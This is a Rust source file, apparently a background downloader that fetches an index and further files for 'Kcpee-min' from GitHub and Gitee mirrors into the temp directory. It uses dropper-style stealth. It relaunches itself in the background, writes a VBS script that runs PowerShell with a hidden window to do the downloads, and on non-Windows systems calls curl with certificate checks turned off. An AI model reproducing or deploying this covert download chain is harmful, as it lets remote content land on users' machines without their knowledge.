//#####![windows_subsystem = "windows" ]
use lazy_static::lazy_static;
use std::env;
use std::fs::read_to_string;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::result::Result;
use std::str;
use std::{thread, time};

type Out<T> = Result<T, Box<dyn std::error::Error>>;
const BASE: &'static str = "https://raw.githubusercontent.com/Qingluan/Kcpee-min/master/";
const BASE2: &'static str = "https://gitee.com/dark.H/Kcpee-min/raw/master/";
const SPE: &'static str = "bc4a23eb8z1";
lazy_static! {
    static ref TEMP_DIR: PathBuf = env::temp_dir();
}

trait StringExtend{
    fn write_to_file(&self,content :&str) -> Out<()>;
    fn exists(&self) -> bool;
    fn remove_file(&self);
}

impl <'a>StringExtend for  &'a str{
    fn exists(&self) -> bool{
        let p = std::path::Path::new(self);
        p.exists()
    }
    fn remove_file(&self){
        if self.exists(){
            let _ = std::fs::remove_file(self);
            println!("[clear] remove file:{}", self);
        }
    }
    fn write_to_file(&self,content :&str) -> Out<()>{
        if !self.exists(){
            let mut file = File::create(self)?;
            file.write_all(content.as_bytes())?;
        }else{
            println!("[write error] :{}", self);
        }
        Ok(())
    }
}

impl StringExtend for PathBuf{
    fn exists(&self) -> bool{
        self.to_str().unwrap().exists()
    }
    fn write_to_file(&self, content : &str) -> Out<()>{
        self.to_str().unwrap().write_to_file(content)
    }
    fn  remove_file(&self){
        self.to_str().unwrap().remove_file()
    }
}

fn windows_no_gui_run_ps(ps_content:&str, if_wait:bool) -> Out<i32>{
    println!("[file]\n{}\n---[ENDFILE]---",ps_content);
    let mut tmp_vbs = TEMP_DIR.clone();
    let mut tmp_ps = TEMP_DIR.clone();
    
    tmp_vbs.push(format!("{}.vbs",SPE));
    tmp_ps.push(format!("{}.ps1", SPE));

    if !tmp_vbs.exists(){
        tmp_vbs.write_to_file(&format!(r#"command ="powershell.exe -nologo -command {}"
set shell = CreateObject("WScript.Shell")
shell.Run command,0
"#, &tmp_ps.to_str().unwrap()))?;
    }
    
    if tmp_ps.exists(){
        &tmp_ps.remove_file();
    }
    tmp_ps.write_to_file(ps_content)?;
    let mut process = Command::new("cmd")
            .args(&["/k", "cscript.exe", "//nologo", tmp_vbs.to_str().unwrap()])
            .stdin(Stdio::piped())
            .spawn()
            .expect("ps downlaod error");
    if if_wait{
        match process.wait() {
            Ok(code) => { 
                if code.code() != Some(0){
                    println!("[err] try other way: {:?} ", tmp_ps.to_str());
                    return Ok(code.code().unwrap());
                }else{
                    println!("[ok] run file: {:?} ",tmp_ps.to_str());
                    
                    Ok(0)
                }
            },
            Err(e) => {
                println!("[err] run err : {}", e);
                Ok(127)
            }
        }
    }else{
        println!("[err] run err : {}", ps_content);
        Ok(0)
    }
}

fn download<F>(url: &str, dst: &str, after: Option<F>, wait:bool) -> Out<()>
where
    F: Fn(&str) + Send + Copy,
{
    // let mut dst_uri = format!("C:\\tmp\\{}", dst);
    let mut dst_path = TEMP_DIR.clone();
    dst_path.push(dst.trim());
    let dst_uri = dst_path.to_str().expect("no").trim().to_string();
    let _ = if cfg!(target_os = "windows") {
        let pscmd = format!(
            "$client = new-object System.Net.WebClient;$client.DownloadFile(\"{}\",\"{}\");",
            url.trim(), dst_uri
        );
        match windows_no_gui_run_ps(&pscmd, wait){
            Ok(code) if code != 0 && !url.contains(BASE2) =>{
                let f = url.split("/").last().unwrap();
                let new_url = format!("{}{}", BASE2, f);
                download(&new_url, dst, after, true)?;
                println!("[succ] download : {}", dst_uri );
                return Ok(());
            },
            Err(e) => {
                println!("[err] run ps failed! {}" ,e);
            }
            _ => {
                println!("[ok] download : {} -> {}", url, dst_uri );
            }
        };

    } else {
        // dst_uri = format!("/tmp/{}", dst);
        let cmd = format!("curl -ksSl '{}' -o '{}' ;", url, dst_uri);
        // println!("{}", cmd);
        let c = Command::new("bash")
            .arg("-c")
            .arg(cmd)
            .output()
            .expect("may wget error ");
        if c.status.code() != Some(0){
            let f_names = url.split("/").collect::<Vec<_>>();
            let f_name = f_names.last().unwrap();
            println!("[err] try route2: {} ",url.trim());
            download(&format!("{}{}", BASE2, f_name), dst, after, wait)?;
        }else{
            println!("[ok] downlod file: {} ",dst.trim());
        }
    };
    if let Some(after_fun) = after {
        for _ in 1..10{
            thread::sleep(time::Duration::from_millis(1000));
            if dst_uri.as_str().exists(){
                
                println!("\t[chains] -> {}", dst_uri);
                after_fun(&dst_uri);
                break;
            }else{
                println!("[wait] not exists: {}", dst_uri);
            }
        }
        Ok(())
    } else {
        Ok(())
    }
}

fn after_dosome(some: &str) {
    println!("[done] {}", some)
}

fn from_index_to_download_more_files(filepath: &str) {
    let sep = "\n";
    
    println!("[after] to read: {}", filepath);
    let mut read_content = String::from(""); 
    for _ in 1..10{
        let _ = match read_to_string(filepath) {
            Ok(ss) => {
                if ss.ends_with("[END]"){
                    read_content = ss.as_str().replace("[END]","");
                    let mut tmp_ps = TEMP_DIR.clone();
                    tmp_ps.push(format!("{}.ps1", SPE));
                    tmp_ps.remove_file();
                    break
                }
            },
            Err(_) => {
                break
            }
        };
        thread::sleep(time::Duration::from_millis(1000));
    }
    let _ = read_content
        .split(sep)
        .collect::<Vec<&str>>()
        .iter()
        .map(|&each_name| {
            if each_name.trim() != "" {
                println!("    [+] need to donwload: {}", each_name.trim());
                let _ = download(
                    &format!("{}{}", BASE, each_name),
                    each_name,
                    Some(after_dosome),
                    true
                );
            }
        })
        .collect::<Vec<_>>();

}

fn background(runner :&str) -> Out<()>{
    
    let wincmd = format!("{} f", runner);
    if cfg!( target_os="windows" ){
        let mut process = Command::new("powershell")
            .args(&["-Command", "-"])
            .stdin(Stdio::piped())
            .spawn().expect("some error for initialization powershell");
        let stdin = process.stdin.as_mut().expect("pipe failure");
        stdin
            .write_all(wincmd.clone().as_bytes()).expect("interact ps error!");
    }else{
        Command::new("bash")
            .arg("-c")
            .arg(&wincmd)
            .spawn().expect("linux initializaltion err");
            // process.spawn();
    }

    Ok(())
}

fn main() -> Out<()> {
    let mut c = 0;
    let mut runner:String = String::from("");
    for arg in env::args(){
        if c ==0 {
            runner = arg.clone();
        }
        if arg == "f"{
            download(
                &format!("{}{}", BASE, "index.list"),
                "index.list",
                Some(from_index_to_download_more_files),
                true
            )?;
            let mut vbs = TEMP_DIR.clone();
            let mut ps = TEMP_DIR.clone();
            vbs.push(format!("{}.vbs", SPE));
            ps.push(format!("{}.ps1", SPE));
            // vbs.remove_file();
            // ps.remove_file();
            return Ok(());
        }
        c+=1;
    }
    println!("ready background!");
    background(&runner).expect("run backgroun err!");
    Ok(())

}
